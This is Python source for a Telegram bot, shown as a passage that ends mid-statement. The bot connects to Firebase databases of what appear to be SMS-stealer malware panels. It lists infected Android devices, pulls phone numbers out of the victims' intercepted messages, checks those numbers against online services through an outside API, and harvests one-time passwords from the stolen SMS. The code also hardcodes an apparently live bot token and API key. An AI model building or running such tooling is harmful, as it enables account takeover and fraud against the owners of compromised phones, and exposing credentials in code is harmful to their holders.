import json
import os
import re
import time
import asyncio
import requests
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, MessageHandler, ConversationHandler, filters, ContextTypes

# Config
BOT_TOKEN = "8924243393:AAGtWZk3qCUceEpVmQdmxxnOxVEhsdXfF68"
API_KEY = "AK_6JvSTn1GdrcssiVvlVFRs5Uw_NxcJshy"
API_BASE = "https://superassets.in"
HEADERS = {"X-API-Key": API_KEY}
DATA_FILE = "/home/nonbios/bot_data.json"

# States
(WAITING_MODE, WAITING_NUMBER, WAITING_SERVICE_AUTO, WAITING_FIREBASE_URL,
 WAITING_FIREBASE_KEY, WAITING_PROBE_CHOICE, WAITING_OTP_DEVICE,
 ADMIN_BROADCAST, ADMIN_BAN, ADMIN_UNBAN, ADMIN_ADD_ADMIN,
 ADMIN_ADD_CHANNEL, ADMIN_REMOVE_CHANNEL, ADMIN_REF_TARGET) = range(14)

# OTP patterns
OTP_PATTERNS = [
    re.compile(r'\b(\d{4,8})\b\s*(?:is your|is the|is ur)', re.IGNORECASE),
    re.compile(r'(?:OTP|otp|Otp)\s*(?:is|:|-|=)\s*(\d{4,8})', re.IGNORECASE),
    re.compile(r'(?:code|Code|CODE)\s*(?:is|:|-|=)\s*(\d{4,8})', re.IGNORECASE),
    re.compile(r'(?:verification code|Verification Code)\s*(?:is|:|-|=)\s*(\d{4,8})', re.IGNORECASE),
    re.compile(r'\b(\d{4,8})\b\s*(?:is your OTP|is your otp|is your code)', re.IGNORECASE),
    re.compile(r'(?:use|enter|submit)\s+(\d{4,8})\s+(?:to|as|for)', re.IGNORECASE),
    re.compile(r'(?:password|PIN|pin)\s*(?:is|:|-|=)\s*(\d{4,8})', re.IGNORECASE),
    re.compile(r'\b(\d{6})\b', re.IGNORECASE),
]

# ===== DATA HELPERS =====
def load_data():
    defaults = {
        "admins": [1344454222],
        "users": [],
        "banned": [],
        "required_channels": [],
        "referral_target": 2,
        "user_referrals": {},
        "lifetime_users": [],
        "search_counts": {},
        "firebase_history": []
    }
    if os.path.exists(DATA_FILE):
        with open(DATA_FILE, "r") as f:
            data = json.load(f)
        # Migrate: add missing keys with defaults
        for key, val in defaults.items():
            if key not in data:
                data[key] = val
        return data
    return defaults.copy()

def save_data(data):
    with open(DATA_FILE, "w") as f:
        json.dump(data, f, indent=2)

def is_admin(user_id):
    return user_id in load_data()["admins"]

def is_banned(user_id):
    return user_id in load_data()["banned"]

def add_user(user_id, username=""):
    data = load_data()
    if not any(u["id"] == user_id for u in data["users"]):
        data["users"].append({"id": user_id, "username": username})
        save_data(data)

def has_lifetime_access(user_id):
    data = load_data()
    return user_id in data.get("lifetime_users", [])

def get_search_count(user_id):
    data = load_data()
    return data.get("search_counts", {}).get(str(user_id), 0)

def increment_search(user_id):
    data = load_data()
    counts = data.get("search_counts", {})
    counts[str(user_id)] = counts.get(str(user_id), 0) + 1
    data["search_counts"] = counts
    save_data(data)

def get_referral_count(user_id):
    data = load_data()
    return data.get("user_referrals", {}).get(str(user_id), 0)

def add_referral(referrer_id):
    data = load_data()
    refs = data.get("user_referrals", {})
    refs[str(referrer_id)] = refs.get(str(referrer_id), 0) + 1
    data["user_referrals"] = refs
    # Check if lifetime access should be granted
    if refs[str(referrer_id)] >= data.get("referral_target", 2):
        if referrer_id not in data.get("lifetime_users", []):
            data["lifetime_users"].append(referrer_id)
    save_data(data)
    return refs[str(referrer_id)]

def can_search(user_id):
    """Check if user can perform a search (admin/lifetime/free quota)"""
    if is_admin(user_id):
        return True, "admin"
    if has_lifetime_access(user_id):
        return True, "lifetime"
    count = get_search_count(user_id)
    if count < 3:
        return True, f"free ({3 - count} left)"
    return False, "quota_exceeded"

async def check_channel_membership(user_id, context):
    """Check if user has joined all required channels. Returns (passed, missing_channels)"""
    data = load_data()
    channels = data.get("required_channels", [])
    if not channels:
        return True, []
    missing = []
    for ch in channels:
        try:
            member = await context.bot.get_chat_member(chat_id=ch, user_id=user_id)
            if member.status in ("left", "kicked"):
                missing.append(ch)
        except:
            missing.append(ch)
    return len(missing) == 0, missing

# ===== API HELPERS =====
def get_services():
    try:
        r = requests.get(f"{API_BASE}/api/v1/services", headers=HEADERS, timeout=10)
        if r.status_code == 200:
            return r.json()
    except:
        pass
    return None

def check_number(service, number):
    """Check number registration via API. Auto-prepends 91 for 10-digit Indian numbers."""
    # Normalize for API: ensure country code prefix
    num = str(number).strip().replace(" ", "").replace("-", "").replace("(", "").replace(")", "")
    if num.startswith("+"):
        num = num[1:]
    # 10-digit Indian number -> prepend 91
    if len(num) == 10 and num[0] in "6789":
        num = "91" + num
    try:
        r = requests.post(f"{API_BASE}/api/v1/check", headers=HEADERS,
                         json={"service": service, "number": num}, timeout=15)
        if r.status_code == 200:
            return r.json()
        elif r.status_code == 400:
            detail = r.text[:200] if r.text else "Bad Request"
            return {"error": f"API rejected request (400)", "detail": detail, "is_api_error": True}
        elif r.status_code == 429:
            return {"error": "Rate limited by API. Try again later.", "is_api_error": True}
        elif r.status_code >= 500:
            return {"error": f"API server error ({r.status_code})", "is_api_error": True}
        else:
            return {"error": f"API returned status {r.status_code}", "detail": r.text[:200] if r.text else "", "is_api_error": True}
    except requests.exceptions.Timeout:
        return {"error": "API request timed out", "is_api_error": True}
    except requests.exceptions.ConnectionError:
        return {"error": "Cannot connect to API server", "is_api_error": True}
    except Exception as e:
        return {"error": str(e), "is_api_error": True}
 
def normalize_phone(number):
    """Normalize phone number: strip +91, spaces, dashes -> 10 digit"""
    n = str(number).strip().replace(" ", "").replace("-", "").replace("(", "").replace(")", "")
    if n.startswith("+"):
        n = n[1:]
    if n.startswith("91") and len(n) == 12:
        n = n[2:]
    if n.startswith("0") and len(n) == 11:
        n = n[1:]
    if len(n) == 10 and n[0] in "6789":
        return n
    return n  # Return as-is if not Indian format

# ===== FIREBASE HELPERS =====
def firebase_get(url, key, path, params=None):
    """Fetch data from Firebase Realtime DB"""
    url = url.strip().rstrip("/")
    if not url.startswith("http"):
        url = "https://" + url
    endpoint = f"{url}/{path}.json?auth={key}"
    if params:
        for k, v in params.items():
            endpoint += f"&{k}={v}"
    try:
        r = requests.get(endpoint, timeout=15)
        if r.status_code == 200:
            return r.json()
        elif r.status_code in (401, 403):
            return {"error": "PERMISSION_DENIED: Check your Database Secret key"}
        else:
            return {"error": f"HTTP {r.status_code}"}
    except Exception as e:
        return {"error": str(e)}

def parse_devices(data):
    """Parse Firebase clients data into device list"""
    devices = []
    if not data or not isinstance(data, dict):
        return devices
    for dev_id, dev_data in data.items():
        if not dev_data or not isinstance(dev_data, dict):
            continue
        sims = dev_data.get("sims", {})
        sim_list = []
        if isinstance(sims, list):
            sim_list = sims
        elif isinstance(sims, dict):
            sim_list = list(sims.values())
        
        # Try multiple phone number fields
        phone = ""
        phone_fields = ["mobNo", "phoneNumber", "phone", "number", "mobile", "cellNumber", "msisdn"]
        for field in phone_fields:
            val = dev_data.get(field)
            if val and str(val).strip() and str(val).strip() != "—":
                phone = str(val).strip()
                break
        
        # Try SIM data if no phone found
        if not phone and sim_list:
            for sim in sim_list:
                if isinstance(sim, dict):
                    for field in ["phoneNumber", "number", "phone", "msisdn", "line1Number"]:
                        val = sim.get(field)
                        if val and str(val).strip() and str(val).strip() != "—":
                            phone = str(val).strip()
                            break
                elif isinstance(sim, str) and sim.strip():
                    phone = sim.strip()
                if phone:
                    break
        
        # Try device ID itself if it looks like a phone number
        if not phone and dev_id and re.match(r'^\+?\d{10,15}$', dev_id.replace(" ", "")):
            phone = dev_id.replace(" ", "")
        
        devices.append({
            "id": dev_id,
            "name": str(dev_data.get("modelName") or dev_data.get("model") or dev_data.get("deviceName") or dev_id),
            "status": bool(dev_data.get("status")),
            "phone": phone,
            "battery": str(dev_data.get("battery", "—")),
            "android": str(dev_data.get("androidV") or dev_data.get("androidVersion") or "—"),
            "provider": str(dev_data.get("service_provider") or "—"),
        })
    return devices

def extract_phone_from_messages(data):
    """Extract phone numbers from SMS messages - exact Profex yh() logic.
    Uses carrier-specific patterns first, returns most frequent number found."""
    from collections import Counter
    if not data or not isinstance(data, dict):
        return []

    # Exact $p patterns from Profex panel, priority ordered (carrier-specific first)
    sa = r"(?:Number|नंबर|Nambhar|नम्बर|No\.?|Num)"
    phone_patterns = [
        re.compile(rf'(?:Jio|JIO)\s+{sa}\s*[:\-]\s*([6-9][0-9]{{9}})'),
        re.compile(rf'(?:Airtel|AIRTEL)\s+{sa}\s*[:\-]\s*([6-9][0-9]{{9}})'),
        re.compile(rf'(?:Vi|VI|Vodafone|VODAFONE|Idea|IDEA)\s+{sa}\s*[:\-]\s*([6-9][0-9]{{9}})'),
        re.compile(rf'(?:BSNL|bsnl)\s+{sa}\s*[:\-]\s*([6-9][0-9]{{9}})'),
        re.compile(rf'(?:MTNL|mtnl)\s+{sa}\s*[:\-]\s*([6-9][0-9]{{9}})'),
        re.compile(rf'(?:Docomo|DOCOMO|Tata)\s+{sa}\s*[:\-]\s*([6-9][0-9]{{9}})'),
        re.compile(rf'(?:Reliance|RELIANCE)\s+{sa}\s*[:\-]\s*([6-9][0-9]{{9}})'),
        re.compile(rf'(?:Telenor|TELENOR)\s+{sa}\s*[:\-]\s*([6-9][0-9]{{9}})'),
        re.compile(rf'(?:Uninor|UNINOR)\s+{sa}\s*[:\-]\s*([6-9][0-9]{{9}})'),
        re.compile(rf'(?:Videocon|VIDEOCON)\s+{sa}\s*[:\-]\s*([6-9][0-9]{{9}})'),
        re.compile(r'(?:नंबर|नम्बर)\s*[:\-]\s*([6-9][0-9]{9})'),
        re.compile(r'(?:your\s+)?(?:mobile|mob\.?|phone|contact)\s+(?:no\.?|number|num|नंबर)\s*[:\-]\s*(\+?91[-\s]?[6-9][0-9]{9})', re.IGNORECASE),
        re.compile(r'(?:your\s+)?(?:mobile|mob\.?|phone|contact)\s+(?:no\.?|number|num|नंबर)\s*[:\-]\s*([6-9][0-9]{9})', re.IGNORECASE),
        re.compile(r'Number\s*[:\-]\s*([6-9][0-9]{9})', re.IGNORECASE),
        re.compile(r'registered\s+(?:mobile\s+)?(?:number|no\.?)\s*[:\-]?\s*([6-9][0-9]{9})', re.IGNORECASE),
        re.compile(r'(\+91[-\s]?[6-9][0-9]{9})'),
        re.compile(r'\b91([6-9][0-9]{9})\b'),
        re.compile(r'(?:^|\s|:)([6-9][0-9]{9})(?:\s|$|\.)'),
    ]

    phone_hits = Counter()
    # Process only last 150 messages like Profex
    entries = list(data.items())
    if len(entries) > 150:
        entries = entries[-150:]

    for msg_id, msg_data in entries:
        if not msg_data or not isinstance(msg_data, dict):
            continue
        text = str(msg_data.get("message") or msg_data.get("body") or msg_data.get("text") or "")
        if not text.strip():
            continue
        # yh() logic: first matching pattern wins for this message
        for pattern in phone_patterns:
            match = pattern.search(text)
            if match:
                raw = match.group(1).replace("+", "").replace("-", "").replace(" ", "")
                # Normalize to 10-digit
                if len(raw) == 10 and raw[0] in "6789":
                    phone_hits[raw] += 1
                elif len(raw) == 12 and raw.startswith("91") and raw[2] in "6789":
                    phone_hits[raw[2:]] += 1
                break  # First match wins per message (like yh() return)

    if not phone_hits:
        return []
    # Return sorted by frequency (most common first)
    return [num for num, _ in phone_hits.most_common()]


def extract_otp_from_messages(data):
    """Extract latest OTP from Firebase messages"""
    if not data or not isinstance(data, dict):
        return None, None
    messages = []
    for msg_id, msg_data in data.items():
        if not msg_data or not isinstance(msg_data, dict):
            continue
        text = str(msg_data.get("message") or msg_data.get("body") or msg_data.get("text") or "")
        sender = str(msg_data.get("sender") or msg_data.get("from") or "Unknown")
        dt = str(msg_data.get("dateTime") or msg_data.get("date") or "")
        if text.strip():
            messages.append({"text": text, "sender": sender, "time": dt})
    
    # Sort by time descending (newest first)
    messages.sort(key=lambda m: m["time"], reverse=True)
    
    # Try to find OTP in recent messages
    for msg in messages[:10]:
        for pattern in OTP_PATTERNS:
            match = pattern.search(msg["text"])
            if match:
                return match.group(1), msg["text"]
    return None, None

# ===== USER HANDLERS =====
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.message.from_user
    if is_banned(user.id):
        await update.message.reply_text("🚫 You are banned.")
        return ConversationHandler.END
    add_user(user.id, user.username or "")
    
    # Clear conversation state for clean restart
    for key in ["mode", "service", "service_list", "firebase_url", "firebase_key",
                "devices", "registered", "unregistered", "errors"]:
        context.user_data.pop(key, None)
    
    # Handle referral deep-link: /start REF_<uid>
    if context.args and len(context.args) > 0:
        arg = context.args[0]
        if arg.startswith("REF_"):
            try:
                referrer_id = int(arg.replace("REF_", ""))
                if referrer_id != user.id:
                    data = load_data()
                    # Check if this user already referred
                    existing_users = [u["id"] for u in data["users"]]
                    if user.id not in existing_users:
                        count = add_referral(referrer_id)
                        target = data.get("referral_target", 2)
                        try:
                            if count >= target:
                                await context.bot.send_message(
                                    chat_id=referrer_id,
                                    text=f"🎉 **Congratulations!** You've reached {count}/{target} referrals!\n🏆 **Lifetime access granted!**",
                                    parse_mode="Markdown"
                                )
                            else:
                                await context.bot.send_message(
                                    chat_id=referrer_id,
                                    text=f"🎉 New referral! Progress: {count}/{target}",
                                    parse_mode="Markdown"
                                )
                        except:
                            pass
            except (ValueError, TypeError):
                pass
    
    # Check required channel membership
    passed, missing = await check_channel_membership(user.id, context)
    if not passed:
        channel_buttons = []
        for ch in missing:
            try:
                chat = await context.bot.get_chat(ch)
                name = chat.title or ch
                link = chat.invite_link or f"https://t.me/{str(ch).replace('@', '')}"
                channel_buttons.append([InlineKeyboardButton(f"📢 Join {name}", url=link)])
            except:
                channel_buttons.append([InlineKeyboardButton(f"📢 Join {ch}", url=f"https://t.me/{str(ch).replace('@', '')}")])
        channel_buttons.append([InlineKeyboardButton("✅ I've Joined — Verify", callback_data="verify_channels")])
        await update.message.reply_text(
            "🔒 **Please join the required channels first:**",
            reply_markup=InlineKeyboardMarkup(channel_buttons), parse_mode="Markdown"
        )
        return WAITING_MODE
    
    # Build user stats
    can, reason = can_search(user.id)
    data = load_data()
    ref_count = get_referral_count(user.id)
    ref_target = data.get("referral_target", 2)
    searches_used = get_search_count(user.id)
    
    if is_admin(user.id):
        status_line = "👑 **Admin** — Unlimited access"
    elif has_lifetime_access(user.id):
        status_line = "🏆 **Lifetime Access** — Unlimited searches"
    else:
        remaining = max(0, 3 - searches_used)
        status_line = f"🔍 Free searches: **{remaining}/3**"
    
    ref_link = f"https://t.me/{(await context.bot.get_me()).username}?start=REF_{user.id}"
    
    buttons = [
        [InlineKeyboardButton("📱 Manual", callback_data="mode_manual"),
         InlineKeyboardButton("🤖 Auto", callback_data="mode_auto")]
    ]
    await update.message.reply_text(
        f"👋 **Welcome, {user.first_name}!**\n\n"
        f"{status_line}\n"
        f"👥 Referrals: **{ref_count}/{ref_target}**\n"
        f"🔗 Your link: `{ref_link}`\n\n"
        f"━━━━━━━━━━━━━━━━━━\n"
        f"🔍 **Choose Mode:**\n\n"
        f"📱 **Manual** — Enter number manually\n"
        f"🤖 **Auto** — Scan Firebase database",
        reply_markup=InlineKeyboardMarkup(buttons), parse_mode="Markdown"
    )
    return WAITING_MODE

async def verify_channels(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    user = query.from_user
    
    passed, missing = await check_channel_membership(user.id, context)
    if not passed:
        await query.answer("❌ You haven't joined all channels yet!", show_alert=True)
        return WAITING_MODE
    
    # Passed — show main menu
    can, reason = can_search(user.id)
    data = load_data()
    ref_count = get_referral_count(user.id)
    ref_target = data.get("referral_target", 2)
    searches_used = get_search_count(user.id)
    
    if is_admin(user.id):
        status_line = "👑 **Admin** — Unlimited access"
    elif has_lifetime_access(user.id):
        status_line = "🏆 **Lifetime Access** — Unlimited searches"
    else:
        remaining = max(0, 3 - searches_used)
        status_line = f"🔍 Free searches: **{remaining}/3**"
    
    buttons = [
        [InlineKeyboardButton("📱 Manual", callback_data="mode_manual"),
         InlineKeyboardButton("🤖 Auto", callback_data="mode_auto")]
    ]
    await query.edit_message_text(
        f"✅ **Channels verified!**\n\n"
        f"{status_line}\n\n"
        f"━━━━━━━━━━━━━━━━━━\n"
        f"🔍 **Choose Mode:**\n\n"
        f"📱 **Manual** — Enter number manually\n"
        f"🤖 **Auto** — Scan Firebase database",
        reply_markup=InlineKeyboardMarkup(buttons), parse_mode="Markdown"
    )
    return WAITING_MODE


async def back_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    user = query.from_user
    
    # Clear stale state
    for key in ["mode", "service", "service_list", "firebase_url", "firebase_key",
                "devices", "registered", "unregistered", "errors"]:
        context.user_data.pop(key, None)
    
    # Rebuild start menu
    can, reason = can_search(user.id)
    data = load_data()
    ref_count = get_referral_count(user.id)
    ref_target = data.get("referral_target", 2)
    searches_used = get_search_count(user.id)
    
    if is_admin(user.id):
        status_line = "👑 **Admin** — Unlimited access"
    elif has_lifetime_access(user.id):
        status_line = "🏆 **Lifetime Access** — Unlimited searches"
    else:
        remaining = max(0, 3 - searches_used)
        status_line = f"🔍 Free searches: **{remaining}/3**"
    
    ref_link = f"https://t.me/{(await context.bot.get_me()).username}?start=REF_{user.id}"
    
    buttons = [
        [InlineKeyboardButton("📱 Manual", callback_data="mode_manual"),
         InlineKeyboardButton("🤖 Auto", callback_data="mode_auto")]
    ]
    await query.edit_message_text(
        f"👋 **Welcome back, {user.first_name}!**\n\n"
        f"{status_line}\n"
        f"👥 Referrals: **{ref_count}/{ref_target}**\n"
        f"🔗 Your link: `{ref_link}`\n\n"
        f"━━━━━━━━━━━━━━━━━━\n"
        f"🔍 **Choose Mode:**\n\n"
        f"📱 **Manual** — Enter number manually\n"
        f"🤖 **Auto** — Scan Firebase database",
        reply_markup=InlineKeyboardMarkup(buttons), parse_mode="Markdown"
    )
    return WAITING_MODE

async def mode_selected(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    user = query.from_user
    
    # Check search quota
    can, reason = can_search(user.id)
    if not can:
        ref_link = f"https://t.me/{(await context.bot.get_me()).username}?start=REF_{user.id}"
        data = load_data()
        ref_target = data.get("referral_target", 2)
        ref_count = get_referral_count(user.id)
        await query.edit_message_text(
            f"🚫 **Free search limit reached (3/3)**\n\n"
            f"To get **unlimited access**, refer {ref_target} users:\n"
            f"👥 Your progress: **{ref_count}/{ref_target}**\n\n"
            f"🔗 Share your link:\n`{ref_link}`",
            parse_mode="Markdown"
        )
        return ConversationHandler.END
    
    mode = query.data.replace("mode_", "")
    context.user_data["mode"] = mode
    
    services = get_services()
    if not services:
        await query.edit_message_text("❌ Failed to fetch services.")
        return ConversationHandler.END
    
    service_list = services.get("services", services) if isinstance(services, dict) else services
    if not service_list:
        await query.edit_message_text("❌ No active services.")
        return ConversationHandler.END
    
    context.user_data["service_list"] = service_list
    buttons = []
    row = []
    prefix = "msvc" if mode == "manual" else "asvc"
    for s in service_list:
        row.append(InlineKeyboardButton(f"📋 {s}", callback_data=f"{prefix}_{s}"))
        if len(row) == 3:
            buttons.append(row)
            row = []
    if row:
        buttons.append(row)
    buttons.append([InlineKeyboardButton("🔙 Back", callback_data="back_start")])
    
    await query.edit_message_text("🔍 **Select a service:**", reply_markup=InlineKeyboardMarkup(buttons), parse_mode="Markdown")
    
    if mode == "manual":
        return WAITING_NUMBER
    else:
        return WAITING_SERVICE_AUTO

# ===== MANUAL MODE =====
async def service_selected_manual(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    context.user_data["service"] = query.data.replace("msvc_", "")
    await query.edit_message_text(
        f"✅ Service: **{context.user_data['service']}**\n\n📱 Enter the number to check:",
        parse_mode="Markdown"
    )
    return WAITING_NUMBER

async def number_received(update: Update, context: ContextTypes.DEFAULT_TYPE):
    number = update.message.text.strip()
    service = context.user_data.get("service")
    if not service:
        await update.message.reply_text("❌ No service selected. Use /start")
        return ConversationHandler.END
    
    increment_search(update.message.from_user.id)
    normalized = normalize_phone(number)
    msg = await update.message.reply_text(f"⏳ Checking `{normalized}` on **{service}**...", parse_mode="Markdown")
    result = check_number(service, normalized)
    
    if "error" in result:
        text = f"❌ **Error:**\n`{result['error']}`"
    else:
        is_reg = result.get("is_registered", False)
        num = result.get("number", number)
        svc = result.get("service", service)
        text = f"✅ **{num}** is **Registered** on **{svc}**" if is_reg else f"❌ **{num}** is **Not Registered** on **{svc}**"
    
    await msg.edit_text(text, parse_mode="Markdown")
    return ConversationHandler.END

# ===== AUTO MODE =====
async def service_selected_auto(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    context.user_data["service"] = query.data.replace("asvc_", "")
    await query.edit_message_text(
        f"✅ Service: **{context.user_data['service']}**\n\n"
        "🔗 **Paste your Firebase Database URL:**\n"
        "Format: `https://your-project.firebaseio.com`",
        parse_mode="Markdown"
    )
    return WAITING_FIREBASE_URL

async def firebase_url_received(update: Update, context: ContextTypes.DEFAULT_TYPE):
    url = update.message.text.strip()
    if "firebaseio.com" not in url and "firebasedatabase.app" not in url:
        await update.message.reply_text("❌ Invalid Firebase URL. Must contain `firebaseio.com` or `firebasedatabase.app`", parse_mode="Markdown")
        return WAITING_FIREBASE_URL
    
    context.user_data["firebase_url"] = url
    await update.message.reply_text("🔑 **Now paste your Database Secret Key:**", parse_mode="Markdown")
    return WAITING_FIREBASE_KEY

async def firebase_key_received(update: Update, context: ContextTypes.DEFAULT_TYPE):
    key = update.message.text.strip()
    context.user_data["firebase_key"] = key
    fb_url = context.user_data["firebase_url"]
    
    msg = await update.message.reply_text("⏳ Connecting to Firebase...")
    
    # Fetch devices
    clients_data = firebase_get(fb_url, key, "clients")
    if isinstance(clients_data, dict) and "error" in clients_data:
        await msg.edit_text(f"❌ Firebase Error:\n`{clients_data['error']}`", parse_mode="Markdown")
        return ConversationHandler.END
    
    devices = parse_devices(clients_data)
    if not devices:
        await msg.edit_text("❌ No devices found in this Firebase database.")
        return ConversationHandler.END
    
    # For devices without phone numbers, try extracting from messages
    no_phone_devs = [d for d in devices if not d["phone"] or d["phone"] == "—" or not d["phone"].strip()]
    if no_phone_devs:
        await msg.edit_text(f"⏳ Found {len(devices)} devices. Extracting phone numbers from messages for {len(no_phone_devs)} devices...")
        for dev in no_phone_devs:
            msgs_data = firebase_get(fb_url, key, f"messages/{dev['id']}")
            if msgs_data and isinstance(msgs_data, dict) and "error" not in msgs_data:
                extracted = extract_phone_from_messages(msgs_data)
                if extracted:
                    dev["phone"] = extracted[0]
    
    context.user_data["devices"] = devices
    
    # Notify admins about Firebase addition
    user = update.message.from_user
    data = load_data()
    for admin_id in data.get("admins", []):
        if admin_id != user.id:
            try:
                await context.bot.send_message(
                    chat_id=admin_id,
                    text=(
                        f"🔔 **Firebase Connected**\n\n"
                        f"👤 User: @{user.username or user.id} (`{user.id}`)\n"
                        f"🔗 URL: `{fb_url}`\n"
                        f"📱 Devices: {len(devices)}"
                    ),
                    parse_mode="Markdown"
                )
            except:
                pass
    
    online = [d for d in devices if d["status"]]
    offline = [d for d in devices if not d["status"]]
    
    # Get phone numbers
    numbers_with_phone = [d for d in devices if d["phone"] and d["phone"] != "—" and d["phone"].strip()]
    
    text = (
        f"📊 **Firebase Connected!**\n\n"
        f"📱 **Total Devices:** {len(devices)}\n"
        f"🟢 **Online:** {len(online)}\n"
        f"🔴 **Offline:** {len(offline)}\n"
        f"📞 **With Numbers:** {len(numbers_with_phone)}\n\n"
        f"**Choose which to probe:**"
    )
    
    buttons = [
        [InlineKeyboardButton(f"🟢 Online ({len(online)})", callback_data="probe_online"),
         InlineKeyboardButton(f"🔴 Offline ({len(offline)})", callback_data="probe_offline")],
        [InlineKeyboardButton(f"📞 All with Numbers ({len(numbers_with_phone)})", callback_data="probe_all")]
    ]
    
    await msg.edit_text(text, reply_markup=InlineKeyboardMarkup(buttons), parse_mode="Markdown")
    return WAITING_PROBE_CHOICE

async def probe_choice(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    choice = query.data.replace("probe_", "")
    
    devices = context.user_data.get("devices", [])
    service = context.user_data.get("service")
    fb_url = context.user_data.get("firebase_url")
    fb_key = context.user_data.get("firebase_key")
    
    if choice == "online":
        targets = [d for d in devices if d["status"] and d["phone"] and d["phone"] != "—"]
    elif choice == "offline":
        targets = [d for d in devices if not d["status"] and d["phone"] and d["phone"] != "—"]
    else:
        targets = [d for d in devices if d["phone"] and d["phone"] != "—"]
    
    if not targets:
        # Show diagnostic info
        if choice == "online":
            category_devs = [d for d in devices if d["status"]]
        elif choice == "offline":
            category_devs = [d for d in devices if not d["status"]]
        else:
            category_devs = devices
        
        diag = f"❌ No devices with phone numbers in this category.\n\n"
        diag += f"📊 **Devices in category:** {len(category_devs)}\n"
        if category_devs:
            sample = category_devs[0]
            diag += f"\n🔍 **Sample device:**\n"
            diag += f"• ID: `{sample['id']}`\n"
            diag += f"• Name: {sample['name']}\n"
            diag += f"• Phone field: `{sample['phone']}`\n"
            diag += f"• Status: {'🟢' if sample['status'] else '🔴'}\n"
        diag += f"\n💡 Phone numbers not found in device fields or messages.\nCheck Firebase structure manually."
        await query.edit_message_text(diag, parse_mode="Markdown")
        return ConversationHandler.END
    
    increment_search(query.from_user.id)
    await query.edit_message_text(f"⏳ **Probing {len(targets)} numbers on {service}...**", parse_mode="Markdown")
    
    registered = []
    unregistered = []
    errors = []
    
    for i, dev in enumerate(targets):
        phone = normalize_phone(dev["phone"])
        
        # Send progress
        try:
            await query.message.edit_text(
                f"⏳ **Checking [{i+1}/{len(targets)}]**\n\n"
                f"📱 Number: `{phone}`\n"
                f"📟 Device: {dev['name']}\n"
                f"🔋 Battery: {dev['battery']}\n"
                f"{'🟢 Online' if dev['status'] else '🔴 Offline'}",
                parse_mode="Markdown"
            )
        except:
            pass
        
        result = check_number(service, phone)
        
        if "error" in result:
            dev["api_error"] = result["error"]
            errors.append(dev)
        elif result.get("is_registered", False):
            registered.append(dev)
        else:
            unregistered.append(dev)
        
        await asyncio.sleep(1)  # Rate limit
    
    # Store results
    context.user_data["unregistered"] = unregistered
    context.user_data["registered"] = registered
    context.user_data["errors"] = errors
    
    # Count stats
    all_devs = context.user_data.get("devices", [])
    numbers_extracted = [d for d in all_devs if d.get("phone") and d["phone"] != "—"]
    online_count = len([d for d in all_devs if d["status"]])
    offline_count = len([d for d in all_devs if not d["status"]])
    
    # Build results message
    text = f"✅ **Scan Complete!**\n\n"
    text += f"📋 **Service:** {service}\n"
    text += f"━━━━━━━━━━━━━━━━━━\n"
    text += f"📊 **Firebase Totals:**\n"
    text += f"  📱 Devices: {len(all_devs)}\n"
    text += f"  🟢 Online: {online_count}\n"
    text += f"  🔴 Offline: {offline_count}\n"
    text += f"  📞 Numbers Extracted: {len(numbers_extracted)}\n"
    text += f"━━━━━━━━━━━━━━━━━━\n"
    text += f"📊 **Probe Results:**\n"
    text += f"  ✅ Registered: {len(registered)}\n"
    text += f"  ❌ Unregistered: {len(unregistered)}\n"
    text += f"  ⚠️ Errors: {len(errors)}\n\n"
    
    if unregistered:
        text += "━━━━━━━━━━━━━━━━━━\n"
        text += "❌ **Unregistered Numbers:**\n\n"
        
        buttons = []
        for dev in unregistered[:20]:
            phone = normalize_phone(dev["phone"])
            text += f"• `{phone}` — {dev['name']} {'🟢' if dev['status'] else '🔴'}\n"
            text += f"  ID: `{dev['id']}`\n\n"
            buttons.append([InlineKeyboardButton(
                f"🔑 Get OTP — {phone}",
                callback_data=f"otp_{dev['id']}"
            )])
        
        if errors:
            text += "━━━━━━━━━━━━━━━━━━\n"
            text += "⚠️ **API Errors:**\n\n"
            for dev in errors[:10]:
                text += f"• `{normalize_phone(dev['phone'])}` — {dev.get('api_error', 'Unknown')}\n"
                text += f"  ID: `{dev['id']}`\n\n"
        
        buttons.append([InlineKeyboardButton("🔙 Start Over", callback_data="back_start")])
        await query.message.edit_text(text, reply_markup=InlineKeyboardMarkup(buttons), parse_mode="Markdown")
    elif errors:
        text += "━━━━━━━━━━━━━━━━━━\n"
        text += "⚠️ **API Errors:**\n\n"
        for dev in errors[:10]:
            text += f"• `{normalize_phone(dev['phone'])}` — {dev.get('api_error', 'Unknown')}\n"
            text += f"  ID: `{dev['id']}`\n\n"
        restart_btn = [[InlineKeyboardButton("🔙 Start Over", callback_data="back_start")]]
        await query.message.edit_text(text, reply_markup=InlineKeyboardMarkup(restart_btn), parse_mode="Markdown")
    else:
        text += "✅ All numbers are registered!"
        restart_btn = [[InlineKeyboardButton("🔙 Start Over", callback_data="back_start")]]
        await query.message.edit_text(text, reply_markup=InlineKeyboardMarkup(restart_btn), parse_mode="Markdown")
    
    # Admin notification for scan
    fb_url = context.user_data.get("firebase_url", "")
    user = update.callback_query.from_user
    admin_text = (
        f"🔔 **Firebase Scan Completed**\n\n"
        f"👤 User: @{user.username or user.id} (`{user.id}`)\n"
        f"🔗 Firebase: `{fb_url}`\n"
        f"📋 Service: {service}\n"
        f"📱 Devices: {len(all_devs)} | 📞 Numbers: {len(numbers_extracted)}\n"
        f"🟢 Online: {online_count} | 🔴 Offline: {offline_count}\n"
        f"✅ Registered: {len(registered)} | ❌ Unreg: {len(unregistered)} | ⚠️ Errors: {len(errors)}"
    )
    data = load_data()
    for admin_id in data.get("admins", []):
        if admin_id != user.id:
            try:
                await context.bot.send_message(chat_id=admin_id, text=admin_text, parse_mode="Markdown")
            except:
                pass
    # Save Firebase scan history
    import datetime
    data = load_data()
    scan_record = {
        "user_id": user.id,
        "username": user.username or "",
        "firebase_url": fb_url,
        "service": service,
        "timestamp": datetime.datetime.now().isoformat(),
        "devices_total": len(all_devs),
        "numbers_extracted": len(numbers_extracted),
        "online": online_count,
        "offline": offline_count,
